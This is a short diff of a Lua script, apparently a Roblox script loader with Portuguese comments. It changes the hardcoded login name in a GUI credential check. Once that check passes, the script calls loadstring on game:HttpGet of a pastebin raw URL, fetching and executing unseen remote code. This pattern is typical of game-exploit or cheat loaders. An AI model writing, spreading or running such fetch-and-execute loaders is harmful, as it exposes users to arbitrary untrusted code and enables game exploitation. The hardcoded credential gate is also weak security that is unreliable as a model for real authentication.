@@ -56,7 +56,7 @@ local function handleLogin()
     local password = passwordTextBox.Text
 
     -- Verificando login e senha
-    if login == "BY_WESLEY" and password == "BY_WESLEY" then
+    if login == "lesle" and password == "BY_WESLEY" then
         -- Executar o script
         loadstring(game:HttpGet("https://pastebin.com/raw/MG9tZT7M"))()
         screenGui:Destroy()  -- Remove a GUI após o login correto
